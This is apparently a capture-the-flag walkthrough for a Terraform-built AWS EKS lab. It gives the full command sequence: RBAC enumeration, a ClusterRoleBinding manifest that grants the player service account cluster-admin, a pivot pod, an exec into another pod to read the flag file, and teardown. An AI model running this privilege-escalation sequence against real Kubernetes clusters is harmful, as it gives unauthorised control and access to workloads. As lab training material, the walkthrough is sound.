terraform init
terraform apply

var.external_ip
  Your public IPv4 address only, no /32.

  Enter a value: YOUR.PUBLIC.IP.HERE

aws eks update-kubeconfig \
  --region "$(terraform output -raw region)" \
  --name "$(terraform output -raw cluster_name)"

kubectl get nodes
kubectl get ns

export KUBECONFIG=./player-kubeconfig.yaml

kubectl auth can-i --list
kubectl get ns
kubectl get clusterroles
kubectl get clusterrolebindings

kubectl describe clusterrole cc0a-weak-recon-escalate

cat > escalate.yaml <<'EOF'
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: snowflake-root
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
- kind: ServiceAccount
  name: snowflake-player
  namespace: ctf-start
EOF

kubectl apply -f escalate.yaml

kubectl auth can-i '*' '*' --all-namespaces

kubectl create ns pwned
kubectl run pivot-box -n pwned --image=busybox:1.36 --command -- sleep 365d
kubectl get pods -A

kubectl exec -n pwned -it pivot-box -- sh

kubectl get pods -A
kubectl describe pod quiet-snowflake -n flag-vault

kubectl exec -n flag-vault -it quiet-snowflake -- cat /opt/flag/flag.txt

cc0a{root_in_the_cloud_context_is_everything}

*TEAR DOWN*

unset KUBECONFIG
terraform destroy